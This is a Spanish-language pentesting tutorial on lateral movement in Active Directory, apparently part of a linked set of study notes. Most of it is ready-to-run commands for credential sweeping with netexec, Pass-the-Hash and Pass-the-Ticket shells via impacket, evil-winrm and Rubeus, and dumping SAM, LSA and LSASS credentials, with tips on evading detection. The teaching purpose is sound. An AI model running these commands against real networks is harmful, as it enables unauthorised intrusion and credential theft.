# Movimiento Lateral en Active Directory

Una vez tienes **credenciales o un hash** de un usuario, el movimiento lateral consiste en **saltar de máquina en máquina** (y de usuario a usuario) reutilizando ese material, sin necesidad de volver a crackear nada. Es el corazón del pentesting de dominios.

> Requiere contexto de [Active Directory](./00%20-%20Introducci%C3%B3n.md) y de credenciales obtenidas por [Kerberoasting/AS-REP](./Kerberoasting%20y%20AS-REP%20Roasting.md) o [BloodHound](./BloodHound.md).

---

## Qué material puedes reutilizar

```flow
Contraseña :: Texto claro. Vale para todo (SMB, WinRM, RDP, Kerberos).
Hash NTLM :: No necesitas la contraseña -> Pass-the-Hash.
Ticket Kerberos (TGT/TGS) :: Pass-the-Ticket / Overpass-the-Hash.
Clave AES :: Pass-the-Key (Kerberos moderno).
```

---

## Validar dónde funcionan tus credenciales (barrido)

Antes de nada, comprueba en qué máquinas del dominio valen con **netexec**:

```bash
# Con contraseña
netexec smb <rango_o_lista> -u <user> -p <pass>
# Con hash (Pass-the-Hash)
netexec smb <rango> -u <user> -H <hash_NTLM>
# ¿Dónde soy admin local? -> busca "(Pwn3d!)"
netexec smb 10.10.20.0/24 -u <user> -p <pass>
```

> **Consejo:** `(Pwn3d!)` en la salida de netexec significa que ahí eres administrador local → puedes ejecutar comandos y volcar credenciales. Barrer toda la subred con una credencial es lo primero del movimiento lateral.

---

## Pass-the-Hash (PtH)

Autenticarte con el **hash NTLM** sin conocer la contraseña:

```bash
# Shell por SMB
impacket-psexec  <dominio>/<user>@<IP> -hashes :<hash_NTLM>
impacket-wmiexec <dominio>/<user>@<IP> -hashes :<hash_NTLM>   # más sigiloso (sin servicio)
impacket-smbexec <dominio>/<user>@<IP> -hashes :<hash_NTLM>

# Shell por WinRM
evil-winrm -i <IP> -u <user> -H <hash_NTLM>

# Validar/ejecutar masivo
netexec smb <IP> -u <user> -H <hash_NTLM> -x "whoami"
```

> **Nota:** `wmiexec` y `smbexec` dejan menos rastro que `psexec` (que crea un servicio). En entornos con detección, prefiere `wmiexec`.

---

## Overpass-the-Hash (Pass-the-Key)

Convierte un hash NTLM en un **TGT de Kerberos** para operar "como Kerberos" (más sigiloso y necesario si NTLM está restringido):

```bash
impacket-getTGT <dominio>/<user> -hashes :<hash_NTLM>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass <dominio>/<user>@<host.dominio.local>
```

---

## Pass-the-Ticket (PtT)

Si robas un ticket Kerberos (`.ccache` en Linux, `.kirbi` en Windows), lo importas y lo usas:

```bash
# Linux
export KRB5CCNAME=/ruta/ticket.ccache
klist
impacket-wmiexec -k -no-pass <host.dominio.local>
```

En Windows con Rubeus:

```text
Rubeus.exe ptt /ticket:<base64_o_fichero.kirbi>
```

---

## RDP con credenciales/hash

```bash
xfreerdp /u:<user> /p:'<pass>' /v:<IP> /cert:ignore
# Pass-the-Hash por RDP (si Restricted Admin está activo)
xfreerdp /u:<user> /pth:<hash_NTLM> /v:<IP> /cert:ignore
```

---

## Robo de credenciales en la máquina comprometida

Cuando eres admin local en un equipo, saca más credenciales para seguir saltando:

```bash
# Volcar la SAM y LSA (local)
netexec smb <IP> -u <user> -p <pass> --sam --lsa
# LSASS (credenciales en memoria) -> mimikatz / lsassy / nanodump
netexec smb <IP> -u <user> -p <pass> -M lsassy
```

Esas credenciales nuevas → repites el barrido → escalas hasta Domain Admin → [DCSync](./DCSync%20y%20Volcado%20de%20Credenciales.md).

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `netexec` | Barrido de credenciales/hashes y ejecución masiva. |
| `impacket` (psexec/wmiexec/smbexec/getTGT) | Ejecución remota y tickets. |
| `evil-winrm` | Shell por WinRM con password o hash. |
| `mimikatz` / `lsassy` | Volcado de credenciales de memoria (LSASS). |
| `Rubeus` | Manipulación de tickets Kerberos en Windows. |

---

> **Consejo:** el bucle del movimiento lateral es: **credencial/hash → barrer la red con netexec → donde seas admin, volcar más credenciales → repetir**. No necesitas la contraseña en claro: con el **hash NTLM** entras igual (PtH). Prefiere `wmiexec` sobre `psexec` por sigilo, y pasa a Kerberos (Overpass-the-Hash) si NTLM está bloqueado.
